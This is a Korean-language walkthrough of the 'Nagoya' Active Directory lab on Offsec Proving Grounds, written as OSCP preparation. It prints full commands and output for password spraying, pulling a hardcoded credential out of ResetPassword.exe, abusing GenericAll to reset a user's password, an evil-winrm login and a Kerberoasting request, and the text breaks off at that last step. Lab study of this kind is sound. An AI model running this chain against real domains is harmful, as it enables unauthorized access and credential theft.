# 0. Offsec Proving Grounds Walkthrough for OSCP prep

> The lab focuses on exploiting enumeration techniques such as SMB enumeration, Kerberoasting, and MSSQL enumeration. You'll also learn password cracking methods and ticket generation processes. This lab emphasizes practical skills in privilege escalation and credential harvesting.
# 1. Recon

## 1.1. Active Scanning
### 1.1.1. nmap

```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -p- --min-rate 1000 $IP -oG all_ports.gnmap
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-11 15:00 +04
Nmap scan report for 192.168.168.21
Host is up (0.082s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49676/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49693/tcp open  unknown
49708/tcp open  unknown
49799/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 209.52 seconds
```

`nmap` 결과 `nagoya-industries.com` 가 도메인임을 확인할 수 있다. 따라서 `/etc/hosts` 에 넣어준다. 

```bash
┌──(root㉿kali)-[/home/kali]
└─# ports=$(grep -oP '\d+(?=/open)' all_ports.gnmap | paste -sd "," -)

┌──(root㉿kali)-[/home/kali]
└─# nmap -sV -A -p$ports --min-rate 5000 $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-11 15:04 +04
Nmap scan report for 192.168.168.21
Host is up (0.082s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Nagoya Industries - Nagoya
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-02-11 11:04:42Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
|_ssl-date: 2026-02-11T11:06:21+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=nagoya.nagoya-industries.com
| Not valid before: 2026-02-10T10:58:32
|_Not valid after:  2026-08-12T10:58:32
| rdp-ntlm-info:
|   Target_Name: NAGOYA-IND
|   NetBIOS_Domain_Name: NAGOYA-IND
|   NetBIOS_Computer_Name: NAGOYA
|   DNS_Domain_Name: nagoya-industries.com
|   DNS_Computer_Name: nagoya.nagoya-industries.com
|   DNS_Tree_Name: nagoya-industries.com
|   Product_Version: 10.0.17763
|_  System_Time: 2026-02-11T11:05:42+00:00
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49666/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
49676/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc             Microsoft Windows RPC
49679/tcp open  msrpc             Microsoft Windows RPC
49693/tcp open  msrpc             Microsoft Windows RPC
49708/tcp open  msrpc             Microsoft Windows RPC
49799/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-02-11T11:05:46
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   81.64 ms 192.168.45.1
2   81.63 ms 192.168.45.254
3   81.70 ms 192.168.251.1
4   81.78 ms 192.168.168.21

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.91 seconds
```
### 1.1.2. ffuf

```bash
┌──(root㉿kali)-[/home/kali]
└─# ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 200 -e .php -fc 403

        /'___\  /'___\           / ___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.168.21/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

Index                   [Status: 200, Size: 3530, Words: 831, Lines: 79, Duration: 83ms]
error                   [Status: 200, Size: 3128, Words: 652, Lines: 69, Duration: 87ms]
favicon.ico             [Status: 200, Size: 5430, Words: 9, Lines: 1, Duration: 81ms]
index                   [Status: 200, Size: 3530, Words: 831, Lines: 79, Duration: 83ms]
team                    [Status: 200, Size: 6896, Words: 3634, Lines: 180, Duration: 94ms]
:: Progress: [9492/9492] :: Job [1/1] :: 2469 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

## 1.2. SMB Scanning
### 1.2.1. smbmap

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# smbmap -H $IP

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)
[!] Access denied on 192.168.168.21, no fun for you...
[*] Closed 1 connections

┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# smbclient -N -L //$IP
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.168.21 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
### 1.2.2. smbclient

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# smbclient -N -L //$IP
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.168.21 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## 1.3. Web Discovery

### 1.3.1. Port 80

80번 포트를 통해 들어오면 아래와 같다. 

![](../images/WindowsAD-02.%20Nagoya.png)

사람들 이름을 찾을 수 있었다. 여기서 `username-anarchy` 를 써야겠다는 생각이 들었다.

![](../images/WindowsAD-02.%20Nagoya-1.png)

그래서 일단 `users.txt` 를 만들어서 계정명으로 추정할 수 있는 파일들을 저장해놨다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# ../../tools/username-anarchy/username-anarchy -i users > users.txt

┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# cat users.txt
matthew
matthewharrison
matthew.harrison
matthewh
mattharr
m.harrison
mharrison
hmatthew
[...SNIP...]
```

## 1.4. Kerberos

### 1.4.1. GetNpUsers

`nmap` 을 통해 스캔한 결과와 내용들을 훑어봤으나 내부로 침입하기에는 정보들이 턱없이 부족했다.

그래서 앞서 계정명으로 추정되는 정보들을 수집하였으니 `impacket-GetNPUsers` 를 통해 돌려보았다. 하지만 데이터가 나오지 않았다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# impacket-GetNPUsers 'nagoya-industries.com/' -usersfile users.txt -format hashcat -outputfile hash -dc-ip $IP
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User matthew.harrison doesnt have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User emma.miah doesnt have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[...SNIP...]
```

### 1.4.2. Kerbrute

두 번째로는 `kerbrute` 를 통해서 `userenum` 을 진행했다. 그랬더니 계정명들을 확보할 수 있었다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# kerbrute userenum -d nagoya-industries.com --dc $IP users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 02/11/26 - Ronnie Flathers @ropnop

2026/02/11 15:49:49 >  Using KDC(s):
2026/02/11 15:49:49 >  	192.168.168.21:88

2026/02/11 15:49:49 >  [+] VALID USERNAME:	 matthew.harrison@nagoya-industries.com
2026/02/11 15:49:49 >  [+] VALID USERNAME:	 emma.miah@nagoya-industries.com
2026/02/11 15:49:49 >  [+] VALID USERNAME:	 rebecca.bell@nagoya-industries.com
2026/02/11 15:49:49 >  [+] VALID USERNAME:	 scott.gardner@nagoya-industries.com
2026/02/11 15:49:49 >  [+] VALID USERNAME:	 terry.edwards@nagoya-industries.com
2026/02/11 15:49:49 >  [+] VALID USERNAME:	 holly.matthews@nagoya-industries.com
2026/02/11 15:49:49 >  [+] VALID USERNAME:	 anne.jenkins@nagoya-industries.com
2026/02/11 15:49:50 >  [+] VALID USERNAME:	 brett.naylor@nagoya-industries.com
2026/02/11 15:49:50 >  [+] VALID USERNAME:	 melissa.mitchell@nagoya-industries.com
2026/02/11 15:49:50 >  [+] VALID USERNAME:	 craig.carr@nagoya-industries.com
2026/02/11 15:49:50 >  [+] VALID USERNAME:	 fiona.clark@nagoya-industries.com
2026/02/11 15:49:50 >  [+] VALID USERNAME:	 patrick.martin@nagoya-industries.com
2026/02/11 15:49:50 >  [+] VALID USERNAME:	 kate.watson@nagoya-industries.com
2026/02/11 15:49:50 >  [+] VALID USERNAME:	 kirsty.norris@nagoya-industries.com
2026/02/11 15:49:50 >  [+] VALID USERNAME:	 andrea.hayes@nagoya-industries.com
2026/02/11 15:49:50 >  [+] VALID USERNAME:	 abigail.hughes@nagoya-industries.com
2026/02/11 15:49:51 >  [+] VALID USERNAME:	 melanie.watson@nagoya-industries.com
2026/02/11 15:49:51 >  [+] VALID USERNAME:	 frances.ward@nagoya-industries.com
2026/02/11 15:49:51 >  [+] VALID USERNAME:	 sylvia.king@nagoya-industries.com
2026/02/11 15:49:51 >  [+] VALID USERNAME:	 wayne.hartley@nagoya-industries.com
2026/02/11 15:49:51 >  [+] VALID USERNAME:	 iain.white@nagoya-industries.com
2026/02/11 15:49:51 >  [+] VALID USERNAME:	 joanna.wood@nagoya-industries.com
2026/02/11 15:49:51 >  [+] VALID USERNAME:	 bethan.webster@nagoya-industries.com
2026/02/11 15:49:51 >  [+] VALID USERNAME:	 elaine.brady@nagoya-industries.com
2026/02/11 15:49:52 >  [+] VALID USERNAME:	 christopher.lewis@nagoya-industries.com
2026/02/11 15:49:52 >  [+] VALID USERNAME:	 megan.johnson@nagoya-industries.com
2026/02/11 15:49:52 >  [+] VALID USERNAME:	 damien.chapman@nagoya-industries.com
2026/02/11 15:49:52 >  [+] VALID USERNAME:	 joanne.lewis@nagoya-industries.com
2026/02/11 15:49:52 >  Done! Tested 405 usernames (28 valid) in 3.418 seconds
```

여기서부터 내용이 좀 이상한데, `PG` 에서는 힌트를 볼 수 있었고, 힌트에서 계절명과 연도를 넣어서 브루트포싱 하라고 했다. 

80포트에서는 웹페이지에 2023년도에 만든 페이지라고 적혀있어서 `Spring` + `2023` 을 조합해서 비밀번호를 게싱할 수 있었다. 게싱한 것으로 얻은 아이디는 `craig.carr:Spring2023` 이었다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# kerbrute passwordspray -d nagoya-industries.com --dc $IP names.txt "Spring2023"

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 02/11/26 - Ronnie Flathers @ropnop

2026/02/11 17:40:22 >  Using KDC(s):
2026/02/11 17:40:22 >  	192.168.168.21:88

2026/02/11 17:40:22 >  [+] VALID LOGIN:	 craig.carr@nagoya-industries.com:Spring2023
2026/02/11 17:40:22 >  Done! Tested 28 logins (1 successes) in 0.520 seconds
```

## 1.5. SMB 재 시도

위에서 크리덴셜을 얻었으므로 다시 `smb` 를 진입한다. 그리하여 `NETLOGON` 과 `SYSVOL` 이라는 공유 디렉토리 두 개를 찾았다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# crackmapexec smb $IP -u craig.carr -p "Spring2023" -d nagoya-industries.com --shares
SMB         192.168.168.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False)
SMB         192.168.168.21  445    NAGOYA           [+] nagoya-industries.com\craig.carr:Spring2023
SMB         192.168.168.21  445    NAGOYA           [+] Enumerated shares
SMB         192.168.168.21  445    NAGOYA           Share           Permissions     Remark
SMB         192.168.168.21  445    NAGOYA           -----           -----------     ------
SMB         192.168.168.21  445    NAGOYA           ADMIN$                          Remote Admin
SMB         192.168.168.21  445    NAGOYA           C$                              Default share
SMB         192.168.168.21  445    NAGOYA           IPC$            READ            Remote IPC
SMB         192.168.168.21  445    NAGOYA           NETLOGON        READ            Logon server share
SMB         192.168.168.21  445    NAGOYA           SYSVOL          READ            Logon server share
```

아쉽게도 `winrm` 은 되지 않았다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# crackmapexec winrm $IP -u craig.carr -p "Spring2023" -d nagoya-industries.com
HTTP        192.168.168.21  5985   192.168.168.21   [*] http://192.168.168.21:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.168.21  5985   192.168.168.21   [-] nagoya-industries.com\craig.carr:Spring2023
```

`NETLOGON` 부터 살펴보았을 때는 `ResetPassword.exe` 등과 같은 파일들을 찾을 수 있었다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# smbclient -U "craig.carr"%"Spring2023" //$IP/NETLOGON
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> ls
  .                                   D        0  Sun Apr 30 12:07:13 2023
  ..                                  D        0  Sun Apr 30 12:07:13 2023
  ResetPassword                       D        0  Sun Apr 30 12:07:07 2023

\ResetPassword
  .                                   D        0  Sun Apr 30 12:07:07 2023
  ..                                  D        0  Sun Apr 30 12:07:07 2023
  ResetPassword.exe                   A     5120  Sun Apr 30 21:04:02 2023
  ResetPassword.exe.config            A      189  Sun Apr 30 20:53:50 2023
  System.IO.FileSystem.AccessControl.dll      A    28552  Tue Oct 20 07:39:30 2020
  System.IO.FileSystem.AccessControl.xml      A    65116  Sat Oct 10 09:10:54 2020
  System.Security.AccessControl.dll      A    35952  Sat Oct 23 12:45:08 2021
  System.Security.AccessControl.xml      A   231631  Tue Oct 19 20:14:20 2021
  System.Security.Permissions.dll      A    30328  Wed Oct 19 05:34:02 2022
  System.Security.Permissions.xml      A     8987  Wed Oct 19 05:34:02 2022
  System.Security.Principal.Windows.dll      A    18312  Tue Oct 20 07:46:28 2020
  System.Security.Principal.Windows.xml      A    90968  Sat Oct 10 09:10:54 2020

		10328063 blocks of size 4096. 4817510 blocks available
smb: \>
```

`SYSVOL` 에서는 대단히 특별한 내용을 찾을 수는 없었다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# smbclient -U "craig.carr"%"Spring2023" //$IP/SYSVOL
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> ls
  .                                   D        0  Sun Apr 30 10:31:25 2023
  ..                                  D        0  Sun Apr 30 10:31:25 2023
  nagoya-industries.com              Dr        0  Sun Apr 30 10:31:25 2023

\nagoya-industries.com
  .                                   D        0  Sun Apr 30 10:37:44 2023
  ..                                  D        0  Sun Apr 30 10:37:44 2023
  DfsrPrivate                      DHSr        0  Sun Apr 30 10:37:44 2023
  Policies                            D        0  Sun Apr 30 10:31:32 2023
  scripts                             D        0  Sun Apr 30 12:07:13 2023

\nagoya-industries.com\DfsrPrivate
NT_STATUS_ACCESS_DENIED listing \nagoya-industries.com\DfsrPrivate\*

\nagoya-industries.com\Policies
  .                                   D        0  Sun Apr 30 10:31:32 2023
  ..                                  D        0  Sun Apr 30 10:31:32 2023
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sun Apr 30 10:31:32 2023
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sun Apr 30 10:31:32 2023

\nagoya-industries.com\scripts
  .                                   D        0  Sun Apr 30 12:07:13 2023
  ..                                  D        0  Sun Apr 30 12:07:13 2023
  ResetPassword                       D        0  Sun Apr 30 12:07:07 2023

\nagoya-industries.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
  .                                   D        0  Sun Apr 30 10:31:32 2023
  ..                                  D        0  Sun Apr 30 10:31:32 2023
  GPT.INI                             A       22  Sun Apr 30 10:39:20 2023
  MACHINE                             D        0  Sun Apr 30 10:39:20 2023
  USER                                D        0  Sun Apr 30 10:31:32 2023

\nagoya-industries.com\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
  .                                   D        0  Sun Apr 30 10:31:32 2023
  ..                                  D        0  Sun Apr 30 10:31:32 2023
  GPT.INI                             A       22  Sun Apr 30 12:38:24 2023
  MACHINE                             D        0  Sun Apr 30 10:31:32 2023
  USER                                D        0  Sun Apr 30 10:31:32 2023

\nagoya-industries.com\scripts\ResetPassword
  .                                   D        0  Sun Apr 30 12:07:07 2023
  ..                                  D        0  Sun Apr 30 12:07:07 2023
  ResetPassword.exe                   A     5120  Sun Apr 30 21:04:02 2023
  ResetPassword.exe.config            A      189  Sun Apr 30 20:53:50 2023
  System.IO.FileSystem.AccessControl.dll      A    28552  Tue Oct 20 07:39:30 2020
  System.IO.FileSystem.AccessControl.xml      A    65116  Sat Oct 10 09:10:54 2020
  System.Security.AccessControl.dll      A    35952  Sat Oct 23 12:45:08 2021
  System.Security.AccessControl.xml      A   231631  Tue Oct 19 20:14:20 2021
  System.Security.Permissions.dll      A    30328  Wed Oct 19 05:34:02 2022
  System.Security.Permissions.xml      A     8987  Wed Oct 19 05:34:02 2022
  System.Security.Principal.Windows.dll      A    18312  Tue Oct 20 07:46:28 2020
  System.Security.Principal.Windows.xml      A    90968  Sat Oct 10 09:10:54 2020

\nagoya-industries.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
  .                                   D        0  Sun Apr 30 10:39:20 2023
  ..                                  D        0  Sun Apr 30 10:39:20 2023
  Microsoft                           D        0  Sun Apr 30 10:31:32 2023
  Registry.pol                        A     2796  Sun Apr 30 10:39:20 2023

\nagoya-industries.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER
  .                                   D        0  Sun Apr 30 10:31:32 2023
  ..                                  D        0  Sun Apr 30 10:31:32 2023

\nagoya-industries.com\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE
  .                                   D        0  Sun Apr 30 10:31:32 2023
  ..                                  D        0  Sun Apr 30 10:31:32 2023
  Microsoft                           D        0  Sun Apr 30 10:31:32 2023

\nagoya-industries.com\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER
  .                                   D        0  Sun Apr 30 10:31:32 2023
  ..                                  D        0  Sun Apr 30 10:31:32 2023

\nagoya-industries.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft
  .                                   D        0  Sun Apr 30 10:31:32 2023
  ..                                  D        0  Sun Apr 30 10:31:32 2023
  Windows NT                          D        0  Sun Apr 30 10:31:32 2023

\nagoya-industries.com\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft
  .                                   D        0  Sun Apr 30 10:31:32 2023
  ..                                  D        0  Sun Apr 30 10:31:32 2023
  Windows NT                          D        0  Sun Apr 30 10:31:32 2023

\nagoya-industries.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sun Apr 30 10:31:32 2023
  ..                                  D        0  Sun Apr 30 10:31:32 2023
  SecEdit                             D        0  Sun Apr 30 10:31:32 2023

\nagoya-industries.com\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sun Apr 30 10:31:32 2023
  ..                                  D        0  Sun Apr 30 10:31:32 2023
  SecEdit                             D        0  Sun Apr 30 12:38:24 2023

\nagoya-industries.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sun Apr 30 10:31:32 2023
  ..                                  D        0  Sun Apr 30 10:31:32 2023
  GptTmpl.inf                         A     1098  Sun Apr 30 10:31:32 2023

\nagoya-industries.com\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sun Apr 30 12:38:24 2023
  ..                                  D        0  Sun Apr 30 12:38:24 2023
  GptTmpl.inf                         A     4938  Sun Apr 30 12:38:24 2023
smb: \>
```

그래서 앞서 확인했던 `ResetPassword.exe` 파일을 확인해 봤다. 그랬더니 `svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg` 라는 크리덴셜을 확보할 수 있었다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# strings -e l ResetPassword.exe
Usage: PasswordReset.exe <Domain Username> <New Password>
nagoya-industries.com
User not found.
Password reset successful.
svc_helpdesk
U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
VS_VERSION_INFO
VarFileInfo
Translation
StringFileInfo
000004b0
Comments
CompanyName
FileDescription
ResetPassword
FileVersion
1.0.0.0
InternalName
ResetPassword.exe
LegalCopyright
Copyright
  2023
LegalTrademarks
OriginalFilename
ResetPassword.exe
ProductName
ResetPassword
ProductVersion
1.0.0.0
Assembly Version
1.0.0.0
```

`U299iYRmikYTHDbPbxPoYYfa2j4x4cdg` 에 대해서 

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# hashid -m U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
Analyzing 'U299iYRmikYTHDbPbxPoYYfa2j4x4cdg'
[+] DNSSEC(NSEC3) [Hashcat Mode: 8300]
```

# 2. Initial Access

## 2.1. bloodhound 를 통한 AD 구조 파악

내부 구조를 파악하기 위해 먼저 `bloodhound-python` 을 통해서 `json` 파일들을 수집한다. 우리는 가지고 있는 크리덴셜이 존재하므로 이걸 최대한 활용한다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# bloodhound-python -d nagoya-industries.com -u 'craig.carr' -p Spring2023 -ns 192.168.168.21
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: nagoya-industries.com
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (nagoya.nagoya-industries.com:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: nagoya.nagoya-industries.com
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 36 users
INFO: Connecting to LDAP server: nagoya.nagoya-industries.com
INFO: Found 56 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: nagoya.nagoya-industries.com
INFO: Done in 00M 08S
```

파일을 드래그&드랍을 해준다. `Import` 를 하면 안 되는데, 이렇게 하면 잘 된다. 

![](../images/WindowsAD-02.%20Nagoya-2.png)

`svc_helpdesk` 계정은 `christoper.lewis` 의 `Generic ALL` 권한을 갖고 있고, `christoper.lewis` 계정은 `Remote Management User` 그룹의 멤버이므로 해당 계정을 통해서 `winrm` 을 실행해볼 수 있을 것이라고 추정할 수 있다.

추가로, `christoper.lewis` 의 경우에는 `HELPDESK` 그룹에 의해 `Generic All` 의 지배를 받는다는 점을 들어서 `svc_helpdesk` 에 의해 비밀번호 변경 등이 가능하다는 점을 확인할 수 있다. 

![](../images/WindowsAD-02.%20Nagoya-4.png)

## 2.2. 내부망 침투

해당 계정의 비밀번호를 `Password123@` 으로 변경했다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# net rpc password "Christopher.Lewis" "Password123@" -U "nagoya-industries.com"/"svc_helpdesk"%"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S "nagoya-industries.com"
```

정상적으로 `evil-winrm` 을 통해서 로그인을 할 수 있었다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# evil-winrm -i $IP -u Christopher.Lewis -p Password123@

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents>
```

우리는 앞서 `svc_helpdesk` 라는 계정을 확인했으니 `svc_` 와 같은 계정들이 내부에 있음을 유추할 수 있고, 그러면 `svc_` 계정들의 크리덴셜을 확보할 수 있는 `GetUserSPNs` 를 이용해서 크리덴셜을 추출해볼 수 있다.

그래서 `svc_mssql` 이라는 계정의 존재를 파악할 수 있었고, 해쉬 암호를 확인할 수 있었다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# impacket-GetUserSPNs nagoya-industries.com/svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg -dc-ip $IP -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName                Name          MemberOf                                          PasswordLastSet             LastLogon                   Delegation
----------------------------------  ------------  ------------------------------------------------  --------------------------  --------------------------  ----------
